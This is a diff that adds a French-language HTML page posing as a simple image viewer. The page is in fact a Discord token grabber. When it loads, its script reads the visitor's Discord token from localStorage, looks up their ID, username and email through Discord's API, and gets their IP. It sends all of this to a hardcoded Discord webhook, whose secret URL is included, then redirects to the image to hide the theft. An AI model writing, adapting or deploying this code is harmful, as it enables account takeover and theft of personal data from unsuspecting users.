@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image</title>
+    <style>
+        body { margin: 0; padding: 0; background: #2f3136; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        img { max-width: 100%; max-height: 100%; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
+    </style>
+</head>
+<body>
+    <!-- Remplace src par l'URL de ton image piégée -->
+    <img src="https://media.discordapp.net/attachments/1503167778234962021/1503167805166587925/SPOILER_image.png?ex=6a96059c&is=6a94b41c&hm=30892b6e1510ac4149823f61df17f232f9215a480c3d362296f5be7140c4eb1f&=&format=webp&quality=lossless&width=1024&height=558" alt="Trap Image" id="trapImg">
+
+    <script>
+        // --- CONFIGURATION ---
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1543762448643915799/o9B-rPF0YGlhtO00A48susJVoQEtou5nDakvei0zLorngDfdvh0KotsbULWKBnpVFTYG";
+
+        // Fonction pour récupérer le token local
+        function getToken() {
+            const keys = Object.keys(localStorage);
+            for (let key of keys) {
+                if (key.startsWith('discord-token-')) {
+                    return localStorage.getItem(key);
+                }
+            }
+            return null;
+        }
+
+        // Fonction pour envoyer les données au webhook
+        async function sendWebhook(data) {
+            const payload = {
+                embeds: [{
+                    title: "💎 Token Capturé !",
+                    color: 5814783, // Rouge/Jaune pour attirer l'attention
+                    fields: [
+                        { name: "🆔 User ID", value: data.userId || "N/A", inline: true },
+                        { name: "👤 Username", value: `${data.username}#${data.discriminator}`, inline: true },
+                        { name: "📧 Email", value: data.email || "N/A", inline: false },
+                        { name: "🔑 Token", value: `\`${data.token}\``, inline: false },
+                        { name: "📍 IP", value: data.ip || "N/A", inline: false }
+                    ],
+                    footer: { text: "Grabber par Vercel" },
+                    timestamp: new Date()
+                }]
+            };
+
+            await fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).catch(err => console.error("Erreur webhook:", err));
+        }
+
+        // Fonction pour récupérer les infos utilisateur via l'API Discord
+        async function getUserInfo(token) {
+            if (!token) return null;
+            try {
+                const res = await fetch("https://discord.com/api/v9/users/@me", {
+                    headers: { "Authorization": token }
+                });
+                if (res.ok) return await res.json();
+            } catch (e) {}
+            return null;
+        }
+
+        // Fonction pour récupérer l'IP
+        async function getIP() {
+            try {
+                const res = await fetch("https://api.ipify.org?format=json");
+                const data = await res.json();
+                return data.ip;
+            } catch (e) { return "N/A"; }
+        }
+
+        // --- EXÉCUTION ---
+        (async () => {
+            const token = getToken();
+            const ip = await getIP();
+            let userInfo = null;
+
+            if (token) {
+                userInfo = await getUserInfo(token);
+            }
+
+            const payload = {
+                userId: userInfo ? userInfo.id : "N/A",
+                username: userInfo ? userInfo.username : "N/A",
+                discriminator: userInfo ? userInfo.discriminator : "N/A",
+                email: userInfo ? userInfo.email : "N/A",
+                token: token || "Introuvable (Pas connecté)",
+                ip: ip
+            };
+
+            await sendWebhook(payload);
+            console.log("Données envoyées !");
+          // Rediriger vers une image normale après 3 secondes
+            setTimeout(() => {
+            window.location.href = "https://media.discordapp.net/attachments/1503167778234962021/1503167805166587925/SPOILER_image.png?ex=6a96059c&is=6a94b41c&hm=30892b6e1510ac4149823f61df17f232f9215a480c3d362296f5be7140c4eb1f&=&format=webp&quality=lossless&width=1024&height=558";
+            }, 2000);
+        })();
+    </script>
+</body>
+</html>
